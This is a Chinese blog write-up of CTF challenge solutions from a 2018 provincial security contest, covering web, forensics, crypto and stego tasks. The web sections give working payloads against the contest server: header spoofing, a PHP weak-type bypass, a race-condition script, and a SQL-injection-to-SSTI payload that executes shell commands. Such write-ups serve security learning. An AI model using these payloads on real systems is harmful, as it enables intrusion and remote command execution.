
 <!DOCTYPE HTML>
<html lang="cn-zh">
<head>
  <meta charset="UTF-8">
  
    <title>第七届山东省信息安全竞赛Writeup | GetFlag&#39;s Blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="GetFlag">
    

    
    <meta name="description" content="留下了没有技术的泪水。。。">
<meta name="keywords" content="山东省大学生信息安全竞赛,科来杯">
<meta property="og:type" content="article">
<meta property="og:title" content="第七届山东省信息安全竞赛Writeup">
<meta property="og:url" content="http://flag0.com/2018/11/08/第七届山东省大学生信息安全竞赛Writeup/index.html">
<meta property="og:site_name" content="GetFlag&#39;s Blog">
<meta property="og:description" content="留下了没有技术的泪水。。。">
<meta property="og:locale" content="cn-zh">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181107235501.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181108000123.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181108001026.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181108001430.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/1541607466905.png">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/1541607569957.png">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104231920.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104232033.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104232055.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104232804.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104232842.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104232945.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104232916.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/1541659886672.png">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/1541660051217.png">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/1541660114437.png">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/20181104233628.jpg">
<meta property="og:image" content="http://flag0.com/img/images/科来杯Writeup/flag.png">
<meta property="og:updated_time" content="2018-11-08T08:30:52.663Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="第七届山东省信息安全竞赛Writeup">
<meta name="twitter:description" content="留下了没有技术的泪水。。。">
<meta name="twitter:image" content="http://flag0.com/img/images/科来杯Writeup/20181107235501.jpg">

    
    <link rel="alternative" href="/atom.xml" title="GetFlag&#39;s Blog" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>

  <body>
    <header>
      
<div>
		
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
						<input type="hidden" name="q" value="site:flag0.com">
					</form>
					
					</li>
				</ul>
			</nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2018/11/08/第七届山东省大学生信息安全竞赛Writeup/" title="第七届山东省信息安全竞赛Writeup" itemprop="url">第七届山东省信息安全竞赛Writeup</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
		
  <p class="article-time">
    <time datetime="2018-11-08T14:00:03.000Z" itemprop="datePublished"> Published 2018-11-08</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		
			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-铜牌-1-babyWeb"><span class="toc-number">1.</span> <span class="toc-text">Web-铜牌-1:babyWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-铜牌-3-babyWeb2"><span class="toc-number">2.</span> <span class="toc-text">Web-铜牌-3:babyWeb2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-银牌1-easy-flask"><span class="toc-number">3.</span> <span class="toc-text">Web-银牌1-easy_flask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-日志分析"><span class="toc-number">4.</span> <span class="toc-text">Forensic-日志分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-weblogic"><span class="toc-number">5.</span> <span class="toc-text">Forensic-weblogic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-特殊后门"><span class="toc-number">6.</span> <span class="toc-text">Forensic-特殊后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Forensic-PC木马"><span class="toc-number">7.</span> <span class="toc-text">Forensic-PC木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stego-啊哒"><span class="toc-number">8.</span> <span class="toc-text">Stego-啊哒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crypto-affine"><span class="toc-number">9.</span> <span class="toc-text">Crypto-affine</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-basic"><span class="toc-number">10.</span> <span class="toc-text">Misc-basic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-进制转换"><span class="toc-number">11.</span> <span class="toc-text">Misc-进制转换</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc-Crack-it"><span class="toc-number">12.</span> <span class="toc-text">Misc-Crack it</span></a></li></ol>
		
		</div>
		
		<p>留下了没有技术的泪水。。。<br><a id="more"></a></p>
<blockquote>
<p>真的打起来比赛了才知道自己有多水，三个web都不难，但是在比赛的时候只做出来了一个，另外的其他方向输出也不理想，现在总结下原因就是，持续性的学习没有养成好的习惯，本来神码国赛结束后有很多的时间去用来学习，即使在两个月漫长的党课学习时间下也是有充足时间来学习的，可惜没有把握好，暑假虽然在Xman经过了短期的学习，感觉提升很多，但是在比赛后没有把握好技术提升的黄金时期，在接培训项目后，项目持续时间中没有保持持续学习，而是自我感觉良好，另外开学后，状态有点松散。。。在接下来的日子里，打好二进制的基础和继续进行Web这块的学习吧，把学习当成习惯。</p>
</blockquote>
<h3 id="Web-铜牌-1-babyWeb"><a href="#Web-铜牌-1-babyWeb" class="headerlink" title="Web-铜牌-1:babyWeb"></a>Web-铜牌-1:babyWeb</h3><p>这道题比较简单相当于Web的签到题</p>
<p>刚开始页面提示ip地址不被允许</p>
<p>伪造<code>XFF</code>头绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
<p>ps:冒号和ip之间要有空格</p>
<p>然后会提示不是管理员</p>
<p>将cookie处的<code>admin=0</code>修改为<code>admin=1</code>即可</p>
<p><img src="\img\images\科来杯Writeup\20181107235501.jpg" alt=""></p>
<p>此处拓展下知识点，在比赛后想要复现赛题，使用<code>$_SERVER[&#39;REMOTE_ADDR&#39;];</code>进行获取ip，但发现尝试各种方式并不能伪造成功，在问了大表哥后，发现<code>ReMOTE_ADDR</code>是安全的获取ip的方式，并不是题目中考察的，现对题目中考察ip伪造的获取ip函数进行简单整理</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">"HTTP_CLIENT_IP"</span>];<span class="comment">//可通过Client-IP伪造</span></span><br><span class="line">$_SERVER[<span class="string">"HTTP_X_FORWARDED_FOR"</span>];<span class="comment">//可通过X_Forward_For伪造</span></span><br><span class="line">$_SERVER[<span class="string">"HTTP_X_REMOTE_IP"</span>];<span class="comment">//可通过X-Remote-IP伪造</span></span><br><span class="line">$_SERVER[<span class="string">"HTTP_X_ORIGINATING_IP"</span>];<span class="comment">//可通过X-Originating-IP伪造</span></span><br><span class="line">$_SERVER[<span class="string">"HTTP_X_REMOTE_ADDR"</span>];<span class="comment">//可通过X-Remote-Addr伪造</span></span><br></pre></td></tr></table></figure>
<h3 id="Web-铜牌-3-babyWeb2"><a href="#Web-铜牌-3-babyWeb2" class="headerlink" title="Web-铜牌-3:babyWeb2"></a>Web-铜牌-3:babyWeb2</h3><p>这个题考点在变量覆盖、php弱类型和条件竞争，在比赛的时候只绕过了变量覆盖和弱类型</p>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'here.php'</span>;</span><br><span class="line">    $key = <span class="string">'kelaibei'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">        $id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">        @parse_str($id);</span><br><span class="line">        <span class="keyword">if</span> ($key[<span class="number">99</span>] != <span class="string">'aabg7XSs'</span> &amp;&amp; md5($key[<span class="number">99</span>]) == md5(<span class="string">'aabg7XSs'</span>)) &#123;</span><br><span class="line">           <span class="keyword">echo</span> $hint;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'try again'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.148.65:29002/?id=key[99]=240610708</span><br></pre></td></tr></table></figure>
<p><code>aabg7XSs</code>的md5为<code>0e087386482136013740957780965295</code></p>
<p>php弱类型漏洞会将md5以0开头的，当作和<code>QNKCDZO</code>的md5是相等的</p>
<p><img src="\img\images\科来杯Writeup\20181108000123.jpg" alt=""></p>
<p>绕过上面的代码后，会出现一个文件上传页面，让输入<code>filename</code>和<code>contain</code>这里存在条件竞争</p>
<p>复现后端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename = @$_GET[<span class="string">'filename'</span>];</span><br><span class="line">$content = @$_GET[<span class="string">'content'</span>];</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">$path = <span class="string">"./uploads/"</span> . Sha1($ip);</span><br><span class="line"><span class="keyword">if</span>(!is_dir($path))&#123;</span><br><span class="line">        mkdir($path,<span class="number">0777</span>,<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($filename) &amp;&amp; <span class="keyword">isset</span>($content) &amp;&amp; $filename != <span class="string">""</span> &amp;&amp; $content != <span class="string">""</span>)</span><br><span class="line">&#123;</span><br><span class="line">        $url = <span class="string">"http://"</span>.gethostbyname(<span class="string">''</span>). str_replace(<span class="string">"."</span>,<span class="string">""</span>,$path) . <span class="string">"/"</span> . $filename;</span><br><span class="line">        $urltext = str_replace(<span class="string">"."</span>,<span class="string">""</span>,$path) . <span class="string">"/"</span> . $filename;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Flag is here,come on~ &lt;a href='$url'&gt;$urltext&lt;/a&gt;"</span>;</span><br><span class="line"></span><br><span class="line">        file_put_contents($path . <span class="string">"/"</span> . $filename,<span class="string">"flag&#123;fa8d57d013fda75ad1e58e59b94b45c3&#125;"</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        file_put_contents($path . <span class="string">"/"</span> . $filename,<span class="string">"Too slow!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里采用手动上传写入文件，并且用一个脚本不停访问的方式来getflag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    flag = requests.get(<span class="string">"http://47.105.148.65:29002/uploads/1daf2370065175025c3cba123c53a12da8a93a5f/test.php"</span>).text</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\科来杯Writeup\20181108001026.jpg" alt=""></p>
<h3 id="Web-银牌1-easy-flask"><a href="#Web-银牌1-easy-flask" class="headerlink" title="Web-银牌1-easy_flask"></a>Web-银牌1-easy_flask</h3><p>这个题考察点在sqli + ssti</p>
<p>比赛中没做出来，但是复现成功后一想，应该算是ssti中比较简单的题，sql注入和ssti均未有任何过滤，但是用sql注入联合查询的返回结果来进行ssti注入攻击的模式是第一次见</p>
<p>刚开始添加用户和输入的数据</p>
<p><img src="\img\images\科来杯Writeup\20181108001430.jpg" alt=""></p>
<p>提交后，提示添加成功，然后在<code>Search Comments</code>中输入刚才的用户名，来提交查询，查询结果会出现在<code>Show Comments</code>中</p>
<p>在查询阶段存在注入</p>
<p><img src="\img\images\科来杯Writeup\1541607466905.png" alt="1541607466905"></p>
<p>利用回显结果来进行ssti攻击</p>
<p>payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.148.65:29003/?username=GetFlag&apos; union select 1,&apos;&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&quot;strings /flag&quot;).read()&#125;&#125;&apos;,3 --+</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\科来杯Writeup\1541607569957.png" alt="1541607569957"></p>
<h3 id="Forensic-日志分析"><a href="#Forensic-日志分析" class="headerlink" title="Forensic-日志分析"></a>Forensic-日志分析</h3><p>下载<code>access.log</code></p>
<p><strong>urldecode</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line">f = open(<span class="string">"access.log"</span>,<span class="string">"r"</span>).readlines()</span><br><span class="line">urllist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    urllist.append(urllib.request.unquote(i))</span><br><span class="line"></span><br><span class="line">s = open(<span class="string">"access_decode.log"</span>,<span class="string">"w"</span>)</span><br><span class="line">s.writelines(urllist)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
<p>打开解码后的日志文件</p>
<p>发现sqlmap盲注的流量，分析后发现其采用了二分法来注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ORDER BY flag LIMIT 0,1),1,1))&gt;64 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 1765 </span><br><span class="line"></span><br><span class="line">ORDER BY flag LIMIT 0,1),1,1))&gt;96 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 1765</span><br><span class="line"></span><br><span class="line">ORDER BY flag LIMIT 0,1),1,1))&gt;112 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 404 5476</span><br><span class="line"></span><br><span class="line">ORDER BY flag LIMIT 0,1),1,1))&gt;104 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 404 5476</span><br><span class="line"></span><br><span class="line">ORDER BY flag LIMIT 0,1),1,1))&gt;100 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 1765</span><br><span class="line"></span><br><span class="line">ORDER BY flag LIMIT 0,1),1,1))&gt;102 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 404 5476</span><br><span class="line"></span><br><span class="line">ORDER BY flag LIMIT 0,1),1,1))&gt;101 AND &apos;RCKM&apos;=&apos;RCKM&amp;Submit=Submit HTTP/1.1&quot; 200 1765</span><br></pre></td></tr></table></figure>
<p>直接按其ASCII码和状态码来进行分析，这里应该可以写脚本，不过我用的手工一个一个的查，25个字符一共。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">123</span>,<span class="number">115</span>,<span class="number">113</span>,<span class="number">108</span>,<span class="number">109</span>,<span class="number">52</span>,<span class="number">112</span>,<span class="number">95</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">48</span>,<span class="number">119</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">125</span>]</span><br><span class="line">flagchar = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> flag:</span><br><span class="line">    flagchar += chr(s)</span><br><span class="line">print(flagchar)</span><br></pre></td></tr></table></figure>
<p>最后将ascii码转为char即可</p>
<p>后来官方的Writeup发出来后，看到了自动化的脚本，简单分析了一波，发现注入出来的正确的Ascii码为最后一个返回正常页面的ascii码+1，并且测试其他不同的sqlmap注入出来的包，原理是通用的，脚本也是通用的，只需要修改的地方就是盲注流量定位处和要读取的文件名</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"access.log"</span>,<span class="string">"r"</span>)</span><br><span class="line">lines = f.readlines()</span><br><span class="line"></span><br><span class="line">datas = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    t = urllib.unquote(line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'1765'</span> <span class="keyword">in</span> t <span class="keyword">and</span> <span class="string">'flag'</span> <span class="keyword">in</span> t: <span class="comment">#过滤出正确返回的盲注flag 的记录</span></span><br><span class="line">        datas.append(t)</span><br><span class="line">flag_ascii = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">    matchOjb = re.search( <span class="string">r'LIMIT 0,1\),(.*?),1\)\)&gt;(.*?) AND'</span>, data)</span><br><span class="line">    <span class="keyword">if</span> matchOjb:</span><br><span class="line">        print(matchOjb.group(<span class="number">1</span>),chr(int(matchOjb.group(<span class="number">2</span>))+<span class="number">1</span>))</span><br><span class="line">        key = int(matchOjb.group(<span class="number">1</span>))</span><br><span class="line">        value = int(matchOjb.group(<span class="number">2</span>)) + <span class="number">1</span>  <span class="comment">#经测试发现，盲注的数据为最后一个显示200的ascii码 + 1</span></span><br><span class="line">        flag_ascii[key] = value <span class="comment">#这里采用字典类型，循环更新，直至每位的最后一个显示200 的 ascii</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> flag_ascii.values():</span><br><span class="line">    flag += chr(value)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h3 id="Forensic-weblogic"><a href="#Forensic-weblogic" class="headerlink" title="Forensic-weblogic"></a>Forensic-weblogic</h3><p>按照题目要求需要寻找主机名，以十六进制的形式提交</p>
<p><code>hostname</code>命令是查看主机名的命令，从流量来看，是一个暴力破解getshell的过程</p>
<p>直接在过滤器中查找hostname</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;hostname&quot;</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\科来杯Writeup\20181104231920.jpg" alt=""></p>
<p>追踪http流</p>
<p><img src="\img\images\科来杯Writeup\20181104232033.jpg" alt=""></p>
<p>可以看到这里执行了<code>hostname</code>命令</p>
<p>往下看可以看到结果</p>
<p><img src="\img\images\科来杯Writeup\20181104232055.jpg" alt=""></p>
<h3 id="Forensic-特殊后门"><a href="#Forensic-特殊后门" class="headerlink" title="Forensic-特殊后门"></a>Forensic-特殊后门</h3><p>题目提示是不只有http协议后门，有可能是icmp、dns。。。。(好几种协议)</p>
<p>这里直接搜索flag，切换各种协议搜索</p>
<p>最终定位到了icmp协议</p>
<p><img src="\img\images\科来杯Writeup\20181104232804.jpg" alt=""></p>
<p>直接点开，发现提示flag is here</p>
<p><img src="\img\images\科来杯Writeup\20181104232842.jpg" alt=""></p>
<p>然后过滤icmp包</p>
<p><img src="\img\images\科来杯Writeup\20181104232945.jpg" alt=""></p>
<p>依次点开在数据包相同的位置有flag字符</p>
<p><img src="\img\images\科来杯Writeup\20181104232916.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Icmp_backdoor_can_transfer-some_infomation&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Forensic-PC木马"><a href="#Forensic-PC木马" class="headerlink" title="Forensic-PC木马"></a>Forensic-PC木马</h3><p>CS是根据真实APT案例中的马改写的，做了简单的反VM虚拟机，反调试，进程检测，12小时的sleep。。。<br>一个思路是使用resource hacker查看资源，会发现其中有一个EXE，是内嵌模块，提取出来，皆可以在虚拟机中运行了，使用火绒剑就能抓到外连CC服务器的连接</p>
<p><img src="\img\images\科来杯Writeup\1541659886672.png" alt="1541659886672"></p>
<p>右击保存为<code>*.bin</code>资源，将后缀保存为exe</p>
<p><img src="\img\images\科来杯Writeup\1541660051217.png" alt="1541660051217"></p>
<p>在火绒剑中加载查看网络信息即可</p>
<p><img src="\img\images\科来杯Writeup\1541660114437.png" alt="1541660114437"></p>
<h3 id="Stego-啊哒"><a href="#Stego-啊哒" class="headerlink" title="Stego-啊哒"></a>Stego-啊哒</h3><p>本来以为是伪加密和修复压缩包，纠结了很长时间，比赛结束后交流发现原来是在<code>属性-&gt;详细信息-&gt;照相机型号</code>的位置有一串十六进制编码，直接转换成字符串就是压缩包的密码</p>
<p><img src="\img\images\科来杯Writeup\20181104233628.jpg" alt=""></p>
<p>转换完后的字符串为</p>
<p><code>sdnisc_2018</code></p>
<p>即为压缩包的密码</p>
<h3 id="Crypto-affine"><a href="#Crypto-affine" class="headerlink" title="Crypto-affine"></a>Crypto-affine</h3><p>y = 17*x-8 flag{szzyfimhyzd}   答案格式：flag{<strong><em>**</em></strong>}</p>
<p>逆算法太过复杂，直接去暴力碰撞即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">"szzyfimhyzd"</span></span><br><span class="line"></span><br><span class="line">flaglist = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    flaglist.append(ord(i)<span class="number">-97</span>)</span><br><span class="line"></span><br><span class="line">flags = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flaglist:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">        c = (<span class="number">17</span> * j - <span class="number">8</span>) % <span class="number">26</span></span><br><span class="line">        <span class="keyword">if</span>(c == i):</span><br><span class="line">            flags += chr(j+<span class="number">97</span>)</span><br><span class="line">print(flags)</span><br></pre></td></tr></table></figure>
<h3 id="Misc-basic"><a href="#Misc-basic" class="headerlink" title="Misc-basic"></a>Misc-basic</h3><p>修改宽读为150，高度为900，然后生成的图片旋转水平翻转即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pic = Image.new(<span class="string">"RGB"</span>,(<span class="number">150</span>,<span class="number">900</span>))</span><br><span class="line">f = open(<span class="string">'basic.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">imlist = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    i = re.sub(<span class="string">'[( )\n]'</span>,<span class="string">''</span>,i)</span><br><span class="line">    imlist.append(i)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">150</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">900</span>):</span><br><span class="line">        s = imlist[i].split(<span class="string">','</span>)</span><br><span class="line">        pic.putpixel([x,y],(int(s[<span class="number">0</span>]),int(s[<span class="number">1</span>]),int(s[<span class="number">2</span>])))</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="number">135000</span>-i</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(<span class="string">"flag.png"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="\img\images\科来杯Writeup\flag.png" alt=""></p>
